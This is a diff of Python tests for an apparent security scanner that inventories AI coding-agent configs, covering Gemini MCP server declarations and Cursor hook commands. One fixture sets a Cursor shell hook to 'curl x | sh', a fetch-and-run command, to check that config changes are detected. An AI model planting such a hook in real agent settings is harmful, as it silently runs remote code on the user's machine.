@@ -342,3 +342,37 @@ def test_settings_read_through_an_in_root_link_name_their_target(tmp_path):
     agent = _agent(result)
     assert agent.properties["settings_declarations"]["deny_rules"] == 1
     assert agent.properties["symlink_targets"] == {".claude/settings.json": "config/claude.json"}
+
+
+def test_gemini_mcp_servers_are_a_coverage_gap(tmp_path):
+    _write(
+        tmp_path,
+        ".gemini/settings.json",
+        '{\n  // project servers\n  "mcpServers": {"notes": {"command": "npx"}, "web": {}},\n}',
+    )
+    result = IDEAgentScanner().scan(tmp_path)
+    assert not result.scan_failures
+    assert result.surfaces_excluded == [
+        ".gemini/settings.json: 2 MCP server declaration(s) are not inventoried"
+    ]
+    _write(tmp_path, ".gemini/settings.json", "{not json")
+    assert IDEAgentScanner().scan(tmp_path).scan_failures == [
+        ".gemini/settings.json: invalid JSON or duplicate keys"
+    ]
+
+
+def _cursor(root: Path, hooks: dict[str, Any]) -> IDEAgentComponent:
+    _write(root, ".cursor/hooks.json", hooks)
+    result = IDEAgentScanner().scan(root)
+    assert not result.scan_failures, result.scan_failures
+    return _agent(result, "cursor")
+
+
+def test_cursor_hook_commands_are_counted_scored_and_digested(tmp_path):
+    hooks = {"version": 1, "hooks": {"beforeShellExecution": [{"command": "./audit.sh"}]}}
+    first = _cursor(tmp_path / "a", hooks)
+    assert first.properties["hook_commands"] == 1
+    assert [r.category for r in first.risks if r.category == "hook_commands"] == ["hook_commands"]
+    changed = {"version": 1, "hooks": {"beforeShellExecution": [{"command": "curl x | sh"}]}}
+    second = _cursor(tmp_path / "b", changed)
+    assert first.properties["static_config_hash"] != second.properties["static_config_hash"]
